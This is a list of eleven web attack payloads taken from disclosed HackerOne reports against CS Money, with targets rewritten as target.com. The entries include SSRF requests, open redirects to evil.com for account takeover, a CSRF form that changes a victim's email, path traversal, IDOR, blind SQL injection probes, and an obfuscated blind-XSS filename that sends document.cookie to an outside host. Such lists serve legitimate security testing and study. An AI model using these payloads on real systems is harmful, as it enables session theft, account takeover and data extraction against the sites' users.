# CS Money

11 payloads.

### `f22abfde`

```
POST /pasteLinkToImage HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:74.0) Gecko/20100101 Firefox/74.0
Accept: application/json, text/plain, */*
Accept-Language: fi-FI,fi;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
Content-Type: application/json;charset=utf-8
Content-Length: 82
Origin: https://target.com
Connection: close
Referer: https://target.com/
Cookie: INSERT_PRIME_COOKIES_HERE

{"link":"http:/INSERT_TARGET_URL_HERE"}
```

**Parameter:** `link`
— [SSRF via 3d.cs.money/pasteLinkToImage](https://hackerone.com/reports/832858) · CS Money · [putsi](https://hackerone.com/putsi)

### `4cd34a0b`

```
https://target.com///evil.com
```

— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `f8e9a14d`

```
https://target.com/login?redirectUrl=https://evil.com///loving-turing-29a494.netlify.app%2523&callbackUrl=https://evil.com///loving-turing-29a494.netlify.app%2523
```

**Parameter:** `redirectUrl`
— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `cd4c5395`

```
https://target.com/#?token=Dlk9sGd8zc6OvxlITijQR&redirectUrl=https://evil.com///loving-turing-29a494.netlify.app#
```

**Parameter:** `redirectUrl`
— [\[cs.money\] Open Redirect Leads to Account Takeover](https://hackerone.com/reports/905607) · CS Money · [abdilahrf_](https://hackerone.com/abdilahrf_)

### `8e4913c3`

```
var FormEl = `
<form action="https://target.com/change_email" method="POST">
        <input type="hidden" name="email" value="nnez+attacker@wearehackerone.com" />
        <button type="submit" style="font-size:28pt;z-index:99999">Submit</button>
    </form>
`;
var Div = document.createElement('div');
Div.innerHTML = FormEl;
document.body.appendChild(Div);
```

— [Site-wide CSRF on Safari due to CORS misconfiguration (not localhost)](https://hackerone.com/reports/975983) · CS Money · [nnez](https://hackerone.com/nnez) · $300.0

### `1f422f8a`

```
Content-Disposition: form-data; name="file"; filename="/../../../../../.html"
```

**Parameter:** `file`
— [Internal Path Disclosure](https://hackerone.com/reports/979110) · CS Money · [mr_vrush](https://hackerone.com/mr_vrush) · $100.0

### `a2077164`

```
POST /api/build/save HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json;charset=utf-8
Content-Length: 8197
Origin: https://target.com
Connection: close
Referer: https://target.com/item/1A0EmD0OCs
Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1
```

**Parameter:** `background`
— [Bypass restrict of member subscription to use custom background in https://target.com without prime subscription](https://hackerone.com/reports/989415) · CS Money · [khoabda1](https://hackerone.com/khoabda1)

### `12d98b59`

```
POST /sync HTTP/1.1
Host: 3d.cs.money
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:80.0) Gecko/20100101 Firefox/80.0
Accept: application/json, text/plain, */*
Accept-Language: vi-VN,vi;q=0.8,en-US;q=0.5,en;q=0.3
Content-Type: application/json;charset=utf-8
Content-Length: 286
Origin: https://target.com
Connection: close
Referer: https://target.com/g3sg1-black-sand-fn
Cookie: __cfduid=dd4a5ae822200c2e5a6622942c8e9b5c61600828055; TEST_GROUP=6; UUID3D=z8yNnunP7rEULv4; _ga=GA1.1.123687
```

**Parameter:** `steamid`
— [IDOR in https://target.com/](https://hackerone.com/reports/990878) · CS Money · [khoabda1](https://hackerone.com/khoabda1)

### `71037f89`

```
- change the filename to \"><img src=1 onerror=\"url=String['fromCharCode'](104,116,116,112,115,58,47,47,103,97,116,111,108,111,117,99,111,46,48,48,48,119,101,98,104,111,115,116,97,112,112,46,99,111,109,47,99,115,109,111,110,101,121,47,105,110,100,101,120,46,112,104,112,63,116,111,107,101,110,115,61)+encodeURIComponent(document['cookie']);xhttp=&#x20new&#x20XMLHttpRequest();xhttp['open']('GET',url,true);xhttp['send']();
```

**Parameter:** `filename`
— [Blind XSS on image upload](https://hackerone.com/reports/1010466) · CS Money · [benjamin-mauss](https://hackerone.com/benjamin-mauss) · $1,000.0

### `b324b3fc`

```
'and%20substr(version(),1,1)='2'-- ==> will give you 200 OK
```

— [Blind Based SQL Injection in target.com.money](https://hackerone.com/reports/1107536) · CS Money · [sawmj](https://hackerone.com/sawmj)

### `1809e100`

```
'and%20substr(version(),2,1)='0'-- ==> will give you 200 OK
```

— [Blind Based SQL Injection in target.com.money](https://hackerone.com/reports/1107536) · CS Money · [sawmj](https://hackerone.com/sawmj)
